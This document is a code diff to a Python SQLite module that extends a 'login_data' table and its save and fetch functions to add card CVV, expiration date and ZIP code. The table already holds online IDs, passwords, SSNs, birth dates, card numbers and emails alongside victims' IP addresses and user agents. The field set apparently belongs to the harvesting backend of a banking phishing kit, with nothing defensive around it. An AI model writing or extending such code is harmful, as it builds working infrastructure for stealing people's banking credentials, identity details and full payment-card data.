@@ -27,11 +27,28 @@ def _get_connection() -> sqlite3.Connection:
             dob TEXT,
             card_number TEXT,
             email TEXT,
+            cvv TEXT,
+            expiration TEXT,
+            zip_code TEXT,
             ip_address TEXT,
             user_agent TEXT,
             created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
         )
     """)
+    
+    # Add new columns if they don't exist (migration for existing databases)
+    cursor = conn.execute("PRAGMA table_info(login_data)")
+    columns = [row[1] for row in cursor.fetchall()]
+    
+    if 'cvv' not in columns:
+        conn.execute("ALTER TABLE login_data ADD COLUMN cvv TEXT")
+    
+    if 'expiration' not in columns:
+        conn.execute("ALTER TABLE login_data ADD COLUMN expiration TEXT")
+    
+    if 'zip_code' not in columns:
+        conn.execute("ALTER TABLE login_data ADD COLUMN zip_code TEXT")
+    
     conn.commit()
     
     return conn
@@ -44,6 +61,9 @@ def save_login_data(
     dob: Optional[str] = None,
     card_number: Optional[str] = None,
     email: Optional[str] = None,
+    cvv: Optional[str] = None,
+    expiration: Optional[str] = None,
+    zip_code: Optional[str] = None,
     ip_address: Optional[str] = None,
     user_agent: Optional[str] = None
 ) -> bool:
@@ -57,6 +77,9 @@ def save_login_data(
         dob: Date of Birth (optional)
         card_number: Card Number (optional)
         email: Email Address (optional)
+        cvv: Card CVV (optional)
+        expiration: Card Expiration Date (optional)
+        zip_code: ZIP Code (optional)
         ip_address: IP address of the user (optional)
         user_agent: User agent string (optional)
         
@@ -69,8 +92,8 @@ def save_login_data(
         
         conn.execute("""
             INSERT INTO login_data 
-            (online_id, password, ssn, dob, card_number, email, ip_address, user_agent, created_at)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            (online_id, password, ssn, dob, card_number, email, cvv, expiration, zip_code, ip_address, user_agent, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """, (
             online_id,
             password,
@@ -78,6 +101,9 @@ def save_login_data(
             dob,
             card_number,
             email,
+            cvv,
+            expiration,
+            zip_code,
             ip_address,
             user_agent,
             now.isoformat()
@@ -104,7 +130,7 @@ def get_all_login_data(limit: int = 100) -> List[Dict]:
     try:
         conn = _get_connection()
         cursor = conn.execute(
-            "SELECT id, online_id, password, ssn, dob, card_number, email, ip_address, user_agent, created_at "
+            "SELECT id, online_id, password, ssn, dob, card_number, email, cvv, expiration, zip_code, ip_address, user_agent, created_at "
             "FROM login_data ORDER BY created_at DESC LIMIT ?",
             (limit,)
         )
@@ -121,6 +147,9 @@ def get_all_login_data(limit: int = 100) -> List[Dict]:
                 "dob": row["dob"],
                 "card_number": row["card_number"],
                 "email": row["email"],
+                "cvv": row["cvv"],
+                "expiration": row["expiration"],
+                "zip_code": row["zip_code"],
                 "ip_address": row["ip_address"],
                 "user_agent": row["user_agent"],
                 "created_at": row["created_at"]
@@ -145,7 +174,7 @@ def get_login_data_by_id(entry_id: int) -> Optional[Dict]:
     try:
         conn = _get_connection()
         cursor = conn.execute(
-            "SELECT id, online_id, password, ssn, dob, card_number, email, ip_address, user_agent, created_at "
+            "SELECT id, online_id, password, ssn, dob, card_number, email, cvv, expiration, zip_code, ip_address, user_agent, created_at "
             "FROM login_data WHERE id = ?",
             (entry_id,)
         )
@@ -163,6 +192,9 @@ def get_login_data_by_id(entry_id: int) -> Optional[Dict]:
             "dob": row["dob"],
             "card_number": row["card_number"],
             "email": row["email"],
+            "cvv": row["cvv"],
+            "expiration": row["expiration"],
+            "zip_code": row["zip_code"],
             "ip_address": row["ip_address"],
             "user_agent": row["user_agent"],
             "created_at": row["created_at"]
